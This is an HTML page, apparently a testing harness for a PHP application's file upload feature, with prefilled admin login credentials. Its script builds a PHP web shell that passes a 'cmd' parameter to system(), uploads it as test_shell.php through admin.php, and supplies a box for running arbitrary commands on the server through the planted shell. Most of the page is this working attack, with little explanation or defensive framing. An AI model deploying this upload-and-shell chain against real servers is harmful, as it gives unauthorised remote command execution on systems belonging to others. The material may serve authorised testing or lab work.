<!DOCTYPE html>
<html>
<head>
    <title>Test File Upload</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        pre {
            background-color: #f5f5f5;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
        }
        .button {
            background-color: #4CAF50;
            border: none;
            color: white;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 10px 2px;
            cursor: pointer;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>Test File Upload</h1>
    <p>This page helps test the file upload functionality directly.</p>
    
    <h2>1. Login</h2>
    <form id="loginForm" action="index.php" method="POST" target="responseFrame">
        <div>
            <label>Username: <input type="text" name="username" value="admin"></label>
        </div>
        <div>
            <label>Password: <input type="password" name="password" value="adminpass"></label>
        </div>
        <button type="submit" class="button">Login</button>
    </form>
    
    <h2>2. Upload Test File</h2>
    <form id="uploadForm" action="admin.php" method="POST" enctype="multipart/form-data" target="responseFrame">
        <div>
            <input type="file" name="file" id="fileInput">
        </div>
        <button type="submit" class="button">Upload File</button>
    </form>
    
    <button onclick="createAndUploadShell()" class="button" style="background-color: #f44336;">Create & Upload PHP Shell</button>
    
    <h2>3. Response</h2>
    <iframe name="responseFrame" id="responseFrame" style="width: 100%; height: 300px; border: 1px solid #ccc;"></iframe>
    
    <h2>4. Check Shell Access</h2>
    <div>
        <input type="text" id="cmdInput" placeholder="Command (e.g., 'id')" style="width: 70%;">
        <button onclick="executeCommand()" class="button" style="background-color: #2196F3;">Execute</button>
    </div>
    <pre id="cmdOutput">Output will appear here...</pre>
    
    <script>
        function createAndUploadShell() {
            // Create PHP shell content
            var phpShellCode = '<?php if(isset($_GET["cmd"])) { echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; } else { echo "<h1>Shell Ready</h1>"; } ?>';
            
            // Create a File object
            var blob = new Blob([phpShellCode], {type: 'application/x-php'});
            var file = new File([blob], 'test_shell.php', {type: 'application/x-php'});
            
            // Create a FormData object and append the file
            var formData = new FormData();
            formData.append('file', file);
            
            // Send the AJAX request
            fetch('admin.php', {
                method: 'POST',
                body: formData,
                credentials: 'include'
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('responseFrame').srcdoc = data;
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
        
        function executeCommand() {
            var cmd = document.getElementById('cmdInput').value;
            if (!cmd) {
                alert('Please enter a command');
                return;
            }
            
            fetch('uploads/test_shell.php?cmd=' + encodeURIComponent(cmd))
            .then(response => response.text())
            .then(data => {
                document.getElementById('cmdOutput').textContent = data;
            })
            .catch(error => {
                document.getElementById('cmdOutput').textContent = 'Error: ' + error.message;
            });
        }
    </script>
</body>
</html>
